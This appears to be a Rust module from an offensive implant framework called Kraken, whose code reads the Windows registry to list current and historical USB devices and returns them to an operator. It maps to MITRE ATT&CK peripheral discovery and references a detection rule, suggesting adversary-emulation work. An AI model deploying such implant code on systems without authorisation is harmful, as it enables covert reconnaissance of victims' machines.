//! mod-usb: USB Device Monitoring Module for Kraken implant
//!
//! Enumerates USB devices from the registry to identify connected and
//! historically connected USB storage and peripheral devices.
//!
//! ## MITRE ATT&CK
//! - T1120: Peripheral Device Discovery
//!
//! ## Detection
//! - wiki/detection/sigma/kraken_usb_enum.yml

use common::{KrakenError, Module, ModuleId, ShellOutput, TaskId, TaskResult};

/// Information about a USB device
#[derive(Debug, Clone)]
pub struct UsbDeviceInfo {
    pub device_id: String,
    pub description: String,
    pub manufacturer: String,
    pub serial_number: String,
    /// Whether device appears currently connected (best-effort heuristic)
    pub connected: bool,
}

pub struct UsbModule {
    id: ModuleId,
}

impl UsbModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("usb"),
        }
    }
}

impl Default for UsbModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for UsbModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "USB Device Monitor"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        // Any non-empty task_data byte 0x01 = list; default (empty) also lists
        let op = task_data.first().copied().unwrap_or(0x01);
        match op {
            0x01 => {
                let devices = list_usb_devices()?;
                let output = format_device_list(&devices);
                Ok(TaskResult::Shell(ShellOutput {
                    stdout: output,
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }))
            }
            _ => Err(KrakenError::Module(format!(
                "unknown usb task op: 0x{:02X}",
                op
            ))),
        }
    }
}

/// Format a list of USB devices into a human-readable string
fn format_device_list(devices: &[UsbDeviceInfo]) -> String {
    if devices.is_empty() {
        return "No USB devices found.\n".into();
    }
    let mut out = format!("USB Devices ({} found)\n", devices.len());
    out.push_str(&"=".repeat(60));
    out.push('\n');
    for dev in devices {
        out.push_str(&format!(
            "ID:           {}\n\
             Description:  {}\n\
             Manufacturer: {}\n\
             Serial:       {}\n\
             Connected:    {}\n\
             {}\n",
            dev.device_id,
            dev.description,
            dev.manufacturer,
            dev.serial_number,
            if dev.connected { "yes" } else { "no (historical)" },
            "-".repeat(40),
        ));
    }
    out
}

// ── Windows implementation ─────────────────────────────────────────────────

#[cfg(windows)]
pub fn list_usb_devices() -> Result<Vec<UsbDeviceInfo>, KrakenError> {
    use windows_sys::Win32::Foundation::{ERROR_NO_MORE_ITEMS, ERROR_SUCCESS};
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegEnumKeyExW, RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE,
        KEY_READ, REG_SZ,
    };

    const USB_KEY: &str = "SYSTEM\\CurrentControlSet\\Enum\\USB";

    let mut devices = Vec::new();

    unsafe {
        let usb_key_wide: Vec<u16> = USB_KEY
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut hkey_usb: windows_sys::Win32::System::Registry::HKEY = 0;
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            usb_key_wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey_usb,
        );
        if status != ERROR_SUCCESS {
            return Err(KrakenError::Module(format!(
                "failed to open USB registry key: {}",
                status
            )));
        }

        // Enumerate VID_xxxx&PID_xxxx subkeys
        let mut vid_idx = 0u32;
        loop {
            let mut vid_name = vec![0u16; 256];
            let mut vid_name_len = vid_name.len() as u32;

            let res = RegEnumKeyExW(
                hkey_usb,
                vid_idx,
                vid_name.as_mut_ptr(),
                &mut vid_name_len,
                std::ptr::null(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );

            if res == ERROR_NO_MORE_ITEMS {
                break;
            }
            if res != ERROR_SUCCESS {
                vid_idx += 1;
                continue;
            }

            let vid_str = String::from_utf16_lossy(&vid_name[..vid_name_len as usize]);

            // Parse VID_ and PID_ from key name like "VID_0781&PID_5567"
            if !vid_str.contains("VID_") {
                vid_idx += 1;
                continue;
            }

            // Open the VID/PID subkey to enumerate instance keys
            let subkey_path: Vec<u16> = format!("{}\\{}", USB_KEY, vid_str)
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let mut hkey_vid: windows_sys::Win32::System::Registry::HKEY = 0;
            let open_res = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                subkey_path.as_ptr(),
                0,
                KEY_READ,
                &mut hkey_vid,
            );

            if open_res == ERROR_SUCCESS {
                // Enumerate instance (serial number) subkeys
                let mut inst_idx = 0u32;
                loop {
                    let mut inst_name = vec![0u16; 256];
                    let mut inst_name_len = inst_name.len() as u32;

                    let inst_res = RegEnumKeyExW(
                        hkey_vid,
                        inst_idx,
                        inst_name.as_mut_ptr(),
                        &mut inst_name_len,
                        std::ptr::null(),
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                    );

                    if inst_res == ERROR_NO_MORE_ITEMS {
                        break;
                    }
                    if inst_res != ERROR_SUCCESS {
                        inst_idx += 1;
                        continue;
                    }

                    let serial =
                        String::from_utf16_lossy(&inst_name[..inst_name_len as usize]);

                    // Open instance key to read FriendlyName, Mfg
                    let inst_path: Vec<u16> =
                        format!("{}\\{}\\{}", USB_KEY, vid_str, serial)
                            .encode_utf16()
                            .chain(std::iter::once(0))
                            .collect();

                    let mut hkey_inst: windows_sys::Win32::System::Registry::HKEY = 0;
                    let inst_open = RegOpenKeyExW(
                        HKEY_LOCAL_MACHINE,
                        inst_path.as_ptr(),
                        0,
                        KEY_READ,
                        &mut hkey_inst,
                    );

                    let (description, manufacturer) = if inst_open == ERROR_SUCCESS {
                        let desc = read_reg_sz(hkey_inst, "FriendlyName")
                            .or_else(|| read_reg_sz(hkey_inst, "DeviceDesc"))
                            .unwrap_or_default();
                        let mfg =
                            read_reg_sz(hkey_inst, "Mfg").unwrap_or_default();
                        RegCloseKey(hkey_inst);
                        (desc, mfg)
                    } else {
                        (String::new(), String::new())
                    };

                    devices.push(UsbDeviceInfo {
                        device_id: format!("USB\\{}\\{}", vid_str, serial),
                        description,
                        manufacturer,
                        serial_number: serial,
                        connected: false, // historical — connection state needs WMI
                    });

                    inst_idx += 1;
                }
                RegCloseKey(hkey_vid);
            }

            vid_idx += 1;
        }

        RegCloseKey(hkey_usb);
    }

    Ok(devices)
}

/// Read a REG_SZ value from an open registry key
#[cfg(windows)]
unsafe fn read_reg_sz(
    hkey: windows_sys::Win32::System::Registry::HKEY,
    value_name: &str,
) -> Option<String> {
    use windows_sys::Win32::Foundation::ERROR_SUCCESS;
    use windows_sys::Win32::System::Registry::{RegQueryValueExW, REG_SZ};

    let name_wide: Vec<u16> = value_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let mut data_type: u32 = 0;
    let mut buf_size: u32 = 0;

    // First call to get required buffer size
    RegQueryValueExW(
        hkey,
        name_wide.as_ptr(),
        std::ptr::null(),
        &mut data_type,
        std::ptr::null_mut(),
        &mut buf_size,
    );

    if data_type != REG_SZ || buf_size == 0 {
        return None;
    }

    let mut buf = vec![0u16; (buf_size / 2 + 1) as usize];
    let res = RegQueryValueExW(
        hkey,
        name_wide.as_ptr(),
        std::ptr::null(),
        &mut data_type,
        buf.as_mut_ptr() as *mut u8,
        &mut buf_size,
    );

    if res != ERROR_SUCCESS {
        return None;
    }

    // Trim null terminator
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    Some(String::from_utf16_lossy(&buf[..end]))
}

// ── Non-Windows stub ───────────────────────────────────────────────────────

#[cfg(not(windows))]
pub fn list_usb_devices() -> Result<Vec<UsbDeviceInfo>, KrakenError> {
    Err(KrakenError::Module(
        "USB device enumeration is only supported on Windows".into(),
    ))
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(UsbModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = UsbModule::new();
        assert_eq!(module.id().as_str(), "usb");
        assert_eq!(module.name(), "USB Device Monitor");
    }

    #[test]
    fn test_invalid_task_op() {
        let module = UsbModule::new();
        let result = module.handle(TaskId::new(), &[0xFF]);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_list_usb_unsupported() {
        assert!(list_usb_devices().is_err());
    }

    #[test]
    fn test_format_empty_list() {
        let output = format_device_list(&[]);
        assert!(output.contains("No USB devices found"));
    }

    #[test]
    fn test_format_device_list() {
        let devices = vec![UsbDeviceInfo {
            device_id: "USB\\VID_0781&PID_5567\\ABC123".into(),
            description: "SanDisk Cruzer".into(),
            manufacturer: "SanDisk".into(),
            serial_number: "ABC123".into(),
            connected: false,
        }];
        let output = format_device_list(&devices);
        assert!(output.contains("SanDisk Cruzer"));
        assert!(output.contains("ABC123"));
        assert!(output.contains("historical"));
    }
}
